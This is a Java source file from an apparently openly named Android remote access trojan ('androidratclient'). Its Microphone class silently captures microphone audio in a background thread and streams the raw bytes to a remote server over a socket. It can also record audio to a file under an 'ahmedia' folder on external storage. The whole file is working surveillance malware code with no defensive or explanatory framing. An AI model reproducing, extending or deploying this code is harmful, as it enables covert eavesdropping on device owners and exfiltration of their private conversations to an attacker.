package com.dev.ah10.androidratclient;

import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;
import java.io.File;

class Microphone //Class to interact with microphone
{

    private boolean runTap = false; //Indicates if stream is in progress
    private boolean isRecording = false; //Indicates if recording is in progress
    private AudioRecord audioHost; //AudioRecord object
    private MediaRecorder mediaHost; //MediaRecorder object
    private ClientSocket cs; //ClientSocket reference

    Microphone(ClientSocket socket) //Constructor
    {
        //Set class global variables
        cs = socket;
    }

    void startTap() //Start streaming microphone
    {
        if (isRecording || runTap) return; //If recording or already streaming then don't start stream
        runTap = true; //Running stream = true
        Thread t = new Thread(
                new Runnable() {
                    @Override
                    public void run() {
                        int bufferSize = AudioRecord.getMinBufferSize( //Get the bufferSize
                                44100,
                                AudioFormat.CHANNEL_IN_MONO,
                                AudioFormat.ENCODING_PCM_16BIT
                        );

                        byte[] audioBytes = new byte[bufferSize]; //Create a new buffer for audio
                        audioHost = new AudioRecord( //Setup the audio recorder
                                MediaRecorder.AudioSource.MIC, //Audio source
                                44100, //Sample rate
                                AudioFormat.CHANNEL_IN_MONO, //Channel Config
                                AudioFormat.ENCODING_PCM_16BIT, //Audio Format
                                bufferSize * 10 //Buffer size
                                );

                        audioHost.startRecording(); //Start recording

                        while (runTap) //while streaming
                        {
                            int bytesRead = audioHost.read(audioBytes, 0, bufferSize); //read bytes from recording

                            cs.sendBytes(audioBytes, bytesRead, true); //send audio bytes to server, ignore protocol = true
                        }
                    }
                }
        );

        t.start(); //Start the stream thread
    }

    void stopTap() //Stop streaming
    {
        if (audioHost != null && runTap) //If streaming and audioHost is not null
        {
            runTap = false; //Streaming = false
            audioHost.release(); //Release the recorder
        }
    }

    void startRecording() //Start recording
    {
        if (runTap || isRecording) return; //If streaming or already recording then don't start stream

        try
        {
            File mediaDirectory = new File(Environment.getExternalStorageDirectory().getPath() + "/ahmedia/"); //Destination directory
            //noinspection ResultOfMethodCallIgnored
            mediaDirectory.mkdirs(); //Create the directories if needed
            File mediaFile = new File(mediaDirectory, "record.3gp"); //Destination file
            mediaHost = new MediaRecorder(); //Create a new MediaRecorder
            mediaHost.setAudioSource(MediaRecorder.AudioSource.MIC); //Audio source is Microphone
            mediaHost.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP); //Set output format
            mediaHost.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); //Set audio encoder
            mediaHost.setOutputFile(mediaFile.getPath()); //Set the outputFile path
            mediaHost.prepare(); //Prepare the recorder
            mediaHost.start(); //Start the recording
            isRecording = true; //Recording = true
        }
        catch (Exception ex) //Failed to start recording
        {
            Log.e("Microphone", "Error starting recording: " + ex.toString());
        }
    }

    void stopRecording() //Stop recording
    {
        if (mediaHost != null && isRecording) //If recording and mediaHost is not null
        {
            mediaHost.stop(); //Stop the recording
            mediaHost.release(); //Release the recorder
            isRecording = false; //Recording = false
        }
    }
}
